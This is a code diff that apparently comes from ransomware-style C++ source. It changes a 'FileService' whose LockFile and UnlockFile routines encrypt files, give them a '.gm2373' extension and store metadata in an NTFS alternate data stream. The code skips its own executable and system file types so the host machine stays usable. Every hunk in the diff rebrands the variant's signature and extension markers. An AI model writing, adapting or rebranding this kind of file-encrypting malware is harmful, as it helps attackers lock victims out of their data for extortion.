@@ -6,8 +6,8 @@
 #include <iostream>
 #include <random>
 
-const std::string MAGIC_SIGNATURE = "LOCK2373";
-const std::string ENCRYPTED_EXTENSION = ".2373";
+const std::string MAGIC_SIGNATURE = "LOCKgm2373";
+const std::string ENCRYPTED_EXTENSION = ".gm2373";
 
 bool FileService::IsPathExcluded(const fs::path &path) {
   if (!g_selfExePath.empty()) {
@@ -47,8 +47,8 @@ bool FileService::IsPathExcluded(const fs::path &path) {
   std::string ext = path.extension().string();
   std::transform(ext.begin(), ext.end(), ext.begin(), ::tolower);
   static const std::vector<std::string> forbiddenExts = {
-      ".exe", ".dll", ".sys", ".ini",  ".lnk", ".msi",  ".bat",
-      ".cmd", ".vbs", ".reg", ".2373", ".pub", ".priv", ".key"};
+      ".exe", ".dll", ".sys", ".ini",    ".lnk", ".msi",  ".bat",
+      ".cmd", ".vbs", ".reg", ".gm2373", ".pub", ".priv", ".key"};
 
   for (const auto &forbiddenExt : forbiddenExts) {
     if (ext == forbiddenExt) {
@@ -195,7 +195,7 @@ bool FileService::LockFile(const fs::path &filePath,
       auto tRename = std::chrono::high_resolution_clock::now();
 
       // 3. Write header and metadata block to NTFS Alternate Data Stream (ADS)
-      std::wstring adsPath = outPath.wstring() + L":2373";
+      std::wstring adsPath = outPath.wstring() + L":gm2373";
       HANDLE hAdsFile = CreateFileW(adsPath.c_str(), GENERIC_WRITE, 0, NULL,
                                     CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
       if (hAdsFile == INVALID_HANDLE_VALUE) {
@@ -335,7 +335,7 @@ bool FileService::UnlockFile(const fs::path &filePath,
 
   try {
     // Check if NTFS Alternate Data Stream exists by attempting to open it
-    std::wstring adsPath = filePath.wstring() + L":2373";
+    std::wstring adsPath = filePath.wstring() + L":gm2373";
     HANDLE hAdsFile = CreateFileW(adsPath.c_str(), GENERIC_READ, 0, NULL,
                                   OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
     bool isFastMode = (hAdsFile != INVALID_HANDLE_VALUE);
